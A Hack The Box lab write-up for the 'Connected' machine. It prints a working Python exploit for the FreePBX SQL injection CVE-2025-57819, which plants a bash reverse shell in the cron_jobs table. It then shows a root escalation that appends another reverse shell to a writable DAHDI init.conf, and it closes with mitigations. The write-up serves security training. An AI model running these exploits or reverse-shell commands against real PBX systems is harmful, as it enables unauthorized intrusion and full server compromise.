---
title: Connected
machineName: Connected
os: linux
difficulty: easy
season: Season 11
tags:
  - FreePBX
  - VoIP
  - Asterisk
  - SQL Injection
  - Auth Bypass
  - CVE-2025-57819
  - Cron Job Injection
  - DAHDI
date: '2026-06-06'
pointsAwarded: 20
machineIP: ''
summary: 'An engaging Easy Linux box showcasing VoIP telephony infrastructure. Initial foothold leverages a critical FreePBX authentication bypass and SQL injection flaw (CVE-2025-57819) to inject a reverse shell into asterisk cron jobs. Privilege escalation abuses write permissions over the DAHDI configuration file /etc/dahdi/init.conf, triggering a privileged daemon restart to capture root.'
---

# 🛡️ HTB - Connected (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Connected
- **Operating System:** Linux (CentOS / FreePBX / Asterisk PBX)
- **Difficulty:** Easy
- **Date of Scan:** 2026-06-06
- **Vulnerabilities:** FreePBX Auth Bypass & SQL Injection to Cron RCE (CVE-2025-57819), Insecure File Permissions on `/etc/dahdi/init.conf` via DAHDI Sysadmin Daemon

---

## Step 1 - Reconnaissance

### Nmap Port Scanning & FreePBX Service Discovery

We initiate our reconnaissance with an aggressive Nmap scan to enumerate open ports and running services:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.9.164
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-07 12:54 UTC
Nmap scan report for 10.129.9.164
Host is up (0.25s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Service Info: OS: Linux; CPE: cpe:/o:centos:centos
```

- 🔍 *We map `connected.htb` to `10.129.9.164` in `/etc/hosts`.*
- 🔍 *Browsing to the web portal reveals FreePBX, a widely deployed open-source PBX management interface powered by Asterisk.*

---

## Step 2 - Initial Foothold

### FreePBX Auth Bypass & SQL Injection to RCE (CVE-2025-57819)

- 🔍 *Analyzing FreePBX endpoints reveals an authentication bypass coupled with an SQL injection flaw discovered by watchTowr researchers (**CVE-2025-57819**).*
- 🔍 *The vulnerability resides in the `endpoint` AJAX module, allowing an unauthenticated remote attacker to execute SQL statements. We can leverage this to insert a malicious scheduled job directly into the `asterisk.cron_jobs` table.*

> ⚠️ **Vulnerability Advisory (CVE-2025-57819):** FreePBX unauthenticated SQL injection via `?module=FreePBX\modules\endpoint\ajax&command=model`. Because the cron daemon executes commands registered in `asterisk.cron_jobs`, arbitrary SQL injection yields asynchronous Remote Code Execution.

- 🔍 *We adapt the watchTowr PoC exploit to deliver a reverse shell:*

```python
import argparse
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(target_url, lhost, lport):
    print(f"[*] Targeting FreePBX at {target_url}...")
    rev_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    # Inject malicious task into asterisk.cron_jobs
    sql_payload = (
        "?module=FreePBX\\modules\\endpoint\\ajax&command=model"
        "&template=x&model=model&brand=x';"
        f"INSERT INTO cron_jobs (jobname, command) VALUES ('watchTowr-pwn', '{rev_shell}') -- "
    )
    
    print("[*] Sending SQL injection payload...")
    r = requests.get(target_url + sql_payload, verify=False)
    print(f"[+] Status: {r.status_code}")
    print("[*] Triggering cron runner execution...")
    requests.get(f"{target_url}/wcb.php", verify=False)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-i', '--ip', required=True)
    parser.add_argument('-p', '--port', required=True)
    args = parser.parse_args()
    exploit(args.url, args.ip, args.port)
```

- 🔍 *We start a Netcat listener and execute the exploit against the target:*

```bash
nc -lvnp 4444
```

```bash
python3 exploit.py -u http://connected.htb -i 10.10.15.54 -p 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.9.164] 49182
bash: cannot set terminal process group (1204): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.2$ whoami
asterisk
bash-4.2$ id
uid=995(asterisk) gid=992(asterisk) groups=992(asterisk)
```

- 🔍 *Initial foothold established as `asterisk`! We grab the user flag in `/home/asterisk/user.txt`.*

---

## Step 3 - Privilege Escalation to Root

### Analyzing dahdi_restart Daemon & Writable init.conf

- 🔍 *We enumerate running processes and background system daemons:*

```bash
ps aux | grep -i sysadmin
```

- 🔍 *We discover a privileged background daemon running as root that monitors `/var/spool/asterisk/sysadmin/dahdi_restart`.*
- 🔍 *When triggered, the daemon restarts DAHDI services and sources the initialization configuration located at `/etc/dahdi/init.conf`.*
- 🔍 *We inspect permissions on `/etc/dahdi/init.conf`:*

```bash
ls -la /etc/dahdi/init.conf
```

```text
-rw-rw-r-- 1 asterisk asterisk 2841 Jun  7 12:40 /etc/dahdi/init.conf
```

- 🔍 *The file is owned by user `asterisk` with write permissions! Because the root daemon sources this script upon restart, we can inject arbitrary commands.*

### Overwriting DAHDI Configuration & Root Execution

- 🔍 *We start a new Netcat listener on our attack machine:*

```bash
nc -lvnp 4446
```

- 🔍 *We append our reverse shell payload to `/etc/dahdi/init.conf`:*

```bash
echo -e '\n#\nbash -i >& /dev/tcp/10.10.15.54/4446 0>&1 &\n#' >> /etc/dahdi/init.conf
```

- 🔍 *Now we trigger the restart daemon by creating the spool sentinel file:*

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

- 🔍 *Checking our listener on port 4446:*

```text
listening on [any] 4446 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.9.164] 59398
bash: cannot set terminal process group (2841): Inappropriate ioctl for device
bash: no job control in this shell
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e4d1a58c973b...
```

- 🔍 *System fully compromised as root!*

---

## Mitigations & Security Perspective

### 🔴 FreePBX SQL Injection & Auth Bypass (CVE-2025-57819)
- **Root Cause:** Insecure handling of HTTP parameters in the `endpoint` AJAX module allowed unauthenticated SQL injection into the `asterisk.cron_jobs` table.
- **Remediation:** Apply vendor security patches for FreePBX. Use parameterized queries across all database access layers.

### 🔴 Writable Configuration Files for Privileged Daemons
- **Root Cause:** The `asterisk` service account owned or had write permissions over `/etc/dahdi/init.conf`, which is sourced directly by root-level administrative scripts.
- **Remediation:** Enforce strict file ownership (`root:root`, `0644`) for all system configuration files consumed by root daemons.
